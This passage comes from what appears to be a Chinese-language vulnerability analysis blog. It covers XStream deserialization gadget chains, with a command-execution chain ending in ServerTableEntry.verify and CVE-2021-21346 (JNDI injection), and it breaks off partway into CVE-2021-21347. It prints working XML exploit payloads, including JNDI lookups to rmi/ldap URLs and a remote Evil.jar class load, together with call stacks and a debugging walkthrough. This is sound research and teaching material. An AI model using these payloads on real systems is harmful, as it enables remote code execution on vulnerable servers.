&lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>跟上条链三分之二的地方相同，就是触发getter的类和方法改变了，变成了ServerTableEntry的verify方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101119497.png" alt="image-20230410111922304"></p>
<p>在verify方法中，这类也是比较直接，直接 Runtime.getRuntime().exec(activationCmd);执行命令。</p>
<p>整个调用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">com.sun.corba.se.impl.activation.ServerTableEntry.verify(ServerTableEntry.java:173)</span><br><span class="line">...</span><br><span class="line">java.lang.reflect.Method.invoke</span><br><span class="line">Accessor$GetterSetterReflection.get</span><br><span class="line">ClassBeanInfoImpl.serializeURIs</span><br><span class="line">XMLSerializer.childAsXsiType</span><br><span class="line">MarshallerImpl.write</span><br><span class="line">BridgeImpl.marshal</span><br><span class="line">Bridge.marshal</span><br><span class="line">BridgeWrapper.marshal</span><br><span class="line">JAXBAttachment.writeTo</span><br><span class="line">JAXBAttachment.asInputStream</span><br><span class="line">JAXBAttachment.getInputStream</span><br><span class="line">XMLMessage$XMLMultiPart.getMessage</span><br><span class="line">XMLMessage$XMLMultiPart.getAttachments</span><br><span class="line">MessageWrapper.getAttachments</span><br><span class="line">ResponseContext.get</span><br><span class="line">DataTransferer$IndexedComparator.compareIndices</span><br><span class="line">DataTransferer$IndexOrderComparator.compare</span><br><span class="line">PriorityQueue.siftDownUsingComparator</span><br><span class="line">PriorityQueue.siftDown</span><br><span class="line">PriorityQueue.heapify</span><br><span class="line">PriorityQueue.readObject</span><br></pre></td></tr></table></figure>

<p>可以使用xml对类对象的某些属性赋值，然后使用Accessor$GetterSetterReflection.get触发类对象任意的方法，这就之后为后续的RCE做铺垫，因为很多类的方法中就包括了命令执行等危险操作。</p>
<p>使用jaxbObject指定要实例化的对象，并为它的某些属性赋值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jaxbObject class=&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;&gt;</span><br><span class="line">	&lt;activationCmd&gt;calc&lt;/activationCmd&gt;</span><br><span class="line">&lt;/jaxbObject&gt;</span><br></pre></td></tr></table></figure>

<p>使用inheritedAttWildcard标签去执行跟jaxbObject标签对应对象的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;inheritedAttWildcard class=&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;&gt;</span><br><span class="line">	&lt;getter&gt;</span><br><span class="line">		&lt;class&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/class&gt;</span><br><span class="line">		&lt;name&gt;verify&lt;/name&gt;</span><br><span class="line">		&lt;parameter-types/&gt;</span><br><span class="line">	&lt;/getter&gt;</span><br><span class="line">&lt;/inheritedAttWildcard&gt;</span><br></pre></td></tr></table></figure>



<h2 id="CVE-2021-21346"><a href="#CVE-2021-21346" class="headerlink" title="CVE-2021-21346"></a>CVE-2021-21346</h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成JNDI注入，官方给的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;javax.swing.MultiUIDefaults&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">      &lt;unserializable-parents/&gt;</span><br><span class="line">      &lt;hashtable&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">          &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;</span><br><span class="line">          &lt;threshold&gt;525&lt;/threshold&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">        &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">      &lt;/hashtable&gt;</span><br><span class="line">      &lt;javax.swing.UIDefaults&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">          &lt;defaultLocale&gt;zh_CN&lt;/defaultLocale&gt;</span><br><span class="line">          &lt;resourceCache/&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">      &lt;/javax.swing.UIDefaults&gt;</span><br><span class="line">      &lt;javax.swing.MultiUIDefaults&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">          &lt;tables&gt;</span><br><span class="line">            &lt;javax.swing.UIDefaults serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">              &lt;unserializable-parents/&gt;</span><br><span class="line">              &lt;hashtable&gt;</span><br><span class="line">                &lt;default&gt;</span><br><span class="line">                  &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;</span><br><span class="line">                  &lt;threshold&gt;525&lt;/threshold&gt;</span><br><span class="line">                &lt;/default&gt;</span><br><span class="line">                &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                &lt;sun.swing.SwingLazyValue&gt;</span><br><span class="line">                  &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;</span><br><span class="line">                  &lt;methodName&gt;doLookup&lt;/methodName&gt;</span><br><span class="line">                  &lt;args&gt;</span><br><span class="line">                    &lt;arg&gt;ldap://localhost:1099/CallRemoteMethod&lt;/arg&gt;</span><br><span class="line">                  &lt;/args&gt;</span><br><span class="line">                &lt;/sun.swing.SwingLazyValue&gt;</span><br><span class="line">              &lt;/hashtable&gt;</span><br><span class="line">              &lt;javax.swing.UIDefaults&gt;</span><br><span class="line">                &lt;default&gt;</span><br><span class="line">                  &lt;defaultLocale reference=&#x27;../../../../../../../javax.swing.UIDefaults/default/defaultLocale&#x27;/&gt;</span><br><span class="line">                  &lt;resourceCache/&gt;</span><br><span class="line">                &lt;/default&gt;</span><br><span class="line">              &lt;/javax.swing.UIDefaults&gt;</span><br><span class="line">            &lt;/javax.swing.UIDefaults&gt;</span><br><span class="line">          &lt;/tables&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">      &lt;/javax.swing.MultiUIDefaults&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">      &lt;m__obj class=&#x27;string&#x27;&gt;test&lt;/m__obj&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p>无法直接运行，我在原作者blog找到了POC可以直接运行，原来官方POC缺少一些属性还有将string标签写成了arg，同时简化了一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;javax.swing.MultiUIDefaults&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">      &lt;unserializable-parents/&gt;</span><br><span class="line">      &lt;hashtable&gt;</span><br><span class="line">        &lt;default /&gt;</span><br><span class="line">        &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">        &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">      &lt;/hashtable&gt;</span><br><span class="line">      &lt;javax.swing.MultiUIDefaults&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">          &lt;tables&gt;</span><br><span class="line">            &lt;javax.swing.UIDefaults serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">              &lt;unserializable-parents/&gt;</span><br><span class="line">              &lt;hashtable&gt;</span><br><span class="line">                &lt;default /&gt;</span><br><span class="line">                &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                &lt;string&gt;lazyValue&lt;/string&gt;</span><br><span class="line">                &lt;sun.swing.SwingLazyValue&gt;</span><br><span class="line">                  &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;</span><br><span class="line">                  &lt;methodName&gt;doLookup&lt;/methodName&gt;</span><br><span class="line">                  &lt;args&gt;</span><br><span class="line">                    &lt;string&gt;rmi://localhost:1097/Object&lt;/string&gt;</span><br><span class="line">                  &lt;/args&gt;</span><br><span class="line">                &lt;/sun.swing.SwingLazyValue&gt;</span><br><span class="line">              &lt;/hashtable&gt;</span><br><span class="line">            &lt;/javax.swing.UIDefaults&gt;</span><br><span class="line">          &lt;/tables&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">      &lt;/javax.swing.MultiUIDefaults&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27; /&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p>利用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">at javax.naming.InitialContext.doLookup(InitialContext.java:290)</span><br><span class="line">...</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at sun.swing.SwingLazyValue.createValue(SwingLazyValue.java:73)</span><br><span class="line">at javax.swing.UIDefaults.getFromHashtable(UIDefaults.java:216)</span><br><span class="line">at javax.swing.UIDefaults.get(UIDefaults.java:161)</span><br><span class="line">at javax.swing.MultiUIDefaults.get(MultiUIDefaults.java:64)</span><br><span class="line">at javax.swing.MultiUIDefaults.toString(MultiUIDefaults.java:197)</span><br><span class="line">at com.sun.org.apache.xpath.internal.objects.XString.equals(XString.java:391)</span><br><span class="line">at javax.naming.ldap.Rdn$RdnEntry.compareTo(Rdn.java:441)</span><br><span class="line">at javax.naming.ldap.Rdn$RdnEntry.compareTo(Rdn.java:420)</span><br><span class="line">at java.util.TreeMap.put(TreeMap.java:568)</span><br><span class="line">at java.util.AbstractMap.putAll(AbstractMap.java:281)</span><br><span class="line">at java.util.TreeMap.putAll(TreeMap.java:327)</span><br><span class="line">at com.thoughtworks.xstream.converters.collections.TreeMapConverter.populateTreeMap(TreeMapConverter.java:121)</span><br><span class="line">at com.thoughtworks.xstream.converters.collections.TreeSetConverter.unmarshal(TreeSetConverter.java:92)</span><br><span class="line">at com.thoughtworks.xstream.core.TreeUnmarshaller.convert(TreeUnmarshaller.java:72)</span><br><span class="line">at com.thoughtworks.xstream.core.AbstractReferenceUnmarshaller.convert(AbstractReferenceUnmarshaller.java:72)</span><br><span class="line">at com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother(TreeUnmarshaller.java:66)</span><br><span class="line">at com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother(TreeUnmarshaller.java:50)</span><br><span class="line">at com.thoughtworks.xstream.core.TreeUnmarshaller.start(TreeUnmarshaller.java:134)</span><br><span class="line">at com.thoughtworks.xstream.core.AbstractTreeMarshallingStrategy.unmarshal(AbstractTreeMarshallingStrategy.java:32)</span><br><span class="line">at com.thoughtworks.xstream.XStream.unmarshal(XStream.java:1409)</span><br><span class="line">at com.thoughtworks.xstream.XStream.unmarshal(XStream.java:1388)</span><br><span class="line">at com.thoughtworks.xstream.XStream.fromXML(XStream.java:1273)</span><br><span class="line">at com.thoughtworks.xstream.XStream.fromXML(XStream.java:1264)</span><br><span class="line">at org.example.Main.main(Main.java:56)</span><br></pre></td></tr></table></figure>

<p>细节：两个javax.naming.ldap.Rdn_-RdnEntry标签。sorted-set标签的默认实现为TreeSet，而为了达到有序的目的，TreeSet内部使用TreeMap来实现有序性，当使用TreeSet的add方法添加元素时，实际上都是将元素作为key添加到它的TreeMap属性，value为PRESENT（为空Object）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101339070.png" alt="image-20230410133901008"></p>
<p>这里的调用链一开始的部分和CVE-2013-7285的一样，直接从AbstractMap.putAll看起。</p>
<p>两个javax.naming.ldap.Rdn_-RdnEntry标签代表往TreeMap存入两个key，key都为javax.naming.ldap.Rdn_-RdnEntryw对象。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101330800.png" alt="image-20230410133042727"></p>
<p>当第一次循环时，通过getKey方法获取第一个javax.naming.ldap.Rdn_-RdnEntryw对象，然后进入put方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101244214.png" alt="image-20230410124430993"></p>
<p>在put方法中，由于root初始化时为null，所以t也为null，然后将创建一个新的Entry，将key（javax.naming.ldap.Rdn_-RdnEntryw对象）放入，并将新的Entry赋值给root，此时root属性就为TreeMap中的第一个Entry。然后返回null，进入第二次循环：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101330800.png" alt="image-20230410133042727"></p>
<p>第二次循环中，进入put方法查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101346213.png" alt="image-20230410134658130"></p>
<p>调用第二个元素的key（对应第二个标签的javax.naming.ldap.Rdn_-RdnEntryw对象）的compareTo方法，将第一个元素的key作为参数传入（对应第一个标签的javax.naming.ldap.Rdn_-RdnEntryw对象）。</p>
<p>这里调用的是第二个标签对象（javax.naming.ldap.Rdn_-RdnEntry）的value属性（XString类实例）的equals方法，同时传入第一个标签对象（javax.naming.ldap.Rdn_-RdnEntry）的value属性（MultiUIDefaults类实例）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101350896.png" alt="image-20230410135023816"></p>
<p>在equals方法中，直接调用MultiUIDefaults类实例的toString方法，跟进：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101353734.png" alt="image-20230410135337676"></p>
<p>在toString方法中，先进入keys方法查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101449625.png" alt="image-20230410144906545"></p>
<p>在keys方法里创建了个MultiUIDefaultsEnumerator对象并将它返回，进入entrySet方法查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101449178.png" alt="image-20230410144929118"></p>
<p>在entrySet方法里，创建了个HashSet对象用来存放Entry类，然后将tables里元素化成Entry实例存入新创建的HashSet对象并返回（tables为UIDefaults数组，UIDefaults类的父类为Hashtable，UIDefaults类没有entrySet方法，而他的父类有，就会调用父类的entrySet方法）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101450243.png" alt="image-20230410145057183"></p>
<p>返回Hashtable的entrySet属性：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101530441.png" alt="image-20230410153017372"></p>
<p>这里的entrySet属性怎么来的呢？</p>
<p>这里需要先看看tables属性存了什么，xml中的tables标签只有一个子标签，代表UIDefaults数组只有一个UIDefaults类实例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;tables&gt;</span><br><span class="line">	&lt;javax.swing.UIDefaults serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">		&lt;unserializable-parents/&gt;</span><br><span class="line">		&lt;hashtable&gt;</span><br><span class="line">			&lt;default /&gt;</span><br><span class="line">			&lt;int&gt;700&lt;/int&gt;</span><br><span class="line">			&lt;int&gt;1&lt;/int&gt;</span><br><span class="line">			&lt;string&gt;lazyValue&lt;/string&gt;</span><br><span class="line">			&lt;sun.swing.SwingLazyValue&gt;</span><br><span class="line">				&lt;className&gt;javax.naming.InitialContext&lt;/className&gt;</span><br><span class="line">				&lt;methodName&gt;doLookup&lt;/methodName&gt;</span><br><span class="line">				&lt;args&gt;</span><br><span class="line">					&lt;string&gt;rmi://localhost:1097/Object&lt;/string&gt;</span><br><span class="line">				&lt;/args&gt;</span><br><span class="line">			&lt;/sun.swing.SwingLazyValue&gt;</span><br><span class="line">		&lt;/hashtable&gt;</span><br><span class="line">	&lt;/javax.swing.UIDefaults&gt;</span><br><span class="line">&lt;/tables&gt;</span><br></pre></td></tr></table></figure>

<p>前面说过unserializable-parents标签代表默认不反序列化父类，但是如果父类的标签在下面就会反序列化，UIDefaults的父类为Hashtable，hashtable标签里的子标签跟Hashtable在readObject方法中一一对应：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101458701.png" alt="image-20230410145851599"></p>
<p>在readObject方法末端，调用reconstitutionPut方法，将key和value封装成Entry，并放入Hashtable的table属性中。这里的table属性会和上面的entrySet属性同步，table属性有啥，entrySet属性就有啥。</p>
<p>所以说entrySet属性存了一个Entry，key为string标签的内容lazyValue，value为SwingLazyValue类实例。</p>
<p>回到这里，然后创建对象，传参：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101449178.png" alt="image-20230410144929118"></p>
<p>将参数赋给两个属性，第二个是将hashset的迭代器赋给iterator属性：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101506254.png" alt="image-20230410150604169"></p>
<p>回到toString方法中，调用nextElement方法获取元素：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101508955.png" alt="image-20230410150809862"></p>
<p>在nextElement方法中，iterator.next()获取到Entry实例，通过getKey获取到lazyValue字符串：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101509124.png" alt="image-20230410150931066"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101527484.png" alt="image-20230410152753426"></p>
<p>回到toString方法中，然后调用get方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101510124.png" alt="image-20230410151004009"></p>
<p>在get方法中，调用父类的get方法中获取不到lazyValue键对应的值（注意！我们未设置第一个hashtable标签的key和value，而是给tables标签下的hashtable设置了key和value）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101551243.png" alt="image-20230410155120167"></p>
<p>然后循环tables数组，调用UIDefaults的get方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101555363.png" alt="image-20230410155505254"></p>
<p>在get方法中又调用了getFromHashtable方法。在getFromHashtable方法中，此时就能获取到value（因为它此时从tables属性里的UIDefaults的父类Hashtable获取的值）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101556041.png" alt="image-20230410155625945"></p>
<p>在getFromHashtable方法的后面，通过获取到的value对象（SwingLazyValue），调用它的createValue方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101557323.png" alt="image-20230410155735236"></p>
<p>在createValue方法中，注册InitialContext类，然后获取该类的doLookup方法，然后执行该方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101559027.png" alt="image-20230410155950962"></p>
<p>在doLookup，造成JNDI注入：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101601773.png" alt="image-20230410160128697"></p>
<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>想把这个漏洞描述清楚很难，因为中间涉及一些细节，很难把这些细节讲清楚，只有动手调试才能理解。</p>
<h2 id="CVE-2021-21347"><a href="#CVE-2021-21347" class="headerlink" title="CVE-2021-21347"></a>CVE-2021-21347</h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>这个漏洞会加载远程jar包，并实例化jar包里指定的类。</p>
<p>官方POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;contentType&gt;text/plain&lt;/contentType&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">            &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">              &lt;iterator class=&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;&gt;</span><br><span class="line">                &lt;names class=&#x27;java.util.AbstractList$Itr&#x27;&gt;</span><br><span class="line">                  &lt;cursor&gt;0&lt;/cursor&gt;</span><br><span class="line">                  &lt;lastRet&gt;-1&lt;/lastRet&gt;</span><br><span class="line">                  &lt;expectedModCount&gt;0&lt;/expectedModCount&gt;</span><br><span class="line">                  &lt;outer-class class=&#x27;java.util.Arrays$ArrayList&#x27;&gt;</span><br><span class="line">                    &lt;a class=&#x27;string-array&#x27;&gt;</span><br><span class="line">                      &lt;string&gt;Evil&lt;/string&gt;</span><br><span class="line">                    &lt;/a&gt;</span><br><span class="line">                  &lt;/outer-class&gt;</span><br><span class="line">                &lt;/names&gt;</span><br><span class="line">                &lt;processorCL class=&#x27;java.net.URLClassLoader&#x27;&gt;</span><br><span class="line">                  &lt;ucp class=&#x27;sun.misc.URLClassPath&#x27;&gt;</span><br><span class="line">                    &lt;urls serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                      &lt;unserializable-parents/&gt;</span><br><span class="line">                      &lt;vector&gt;</span><br><span class="line">                        &lt;default&gt;</span><br><span class="line">                          &lt;capacityIncrement&gt;0&lt;/capacityIncrement&gt;x</span><br><span class="line">                          &lt;elementCount&gt;1&lt;/elementCount&gt;</span><br><span class="line">                          &lt;elementData&gt;</span><br><span class="line">                            &lt;url&gt;http://127.0.0.1:80/Evil.jar&lt;/url&gt;</span><br><span class="line">                          &lt;/elementData&gt;</span><br><span class="line">                        &lt;/default&gt;</span><br><span class="line">                      &lt;/vector&gt;</span><br><span class="line">                    &lt;/urls&gt;</span><br><span class="line">                    &lt;path&gt;x</span><br><span class="line">                      &lt;url&gt;http://127.0.0.1:80/Evil.jar&lt;/url&gt;</span><br><span class="line">                    &lt;/path&gt;</span><br><span class="line">                    &lt;loaders/&gt;</span><br><span class="line">                    &lt;lmap/&gt;</span><br><span class="line">                  &lt;/ucp&gt;</span><br><span class="line">                  &lt;package2certs class=&#x27;concurrent-hash-map&#x27;/&gt;</span><br><span class="line">                  &lt;classes/&gt;</span><br><span class="line">                  &lt;defaultDomain&gt;</span><br><span class="line">                    &lt;classloader class=&#x27;java.net.URLClassLoader&#x27; reference=&#x27;../..&#x27;/&gt;</span><br><span class="line">                    &lt;principals/&gt;</span><br><span class="line">                    &lt;hasAllPerm&gt;false&lt;/hasAllPerm&gt;</span><br><span 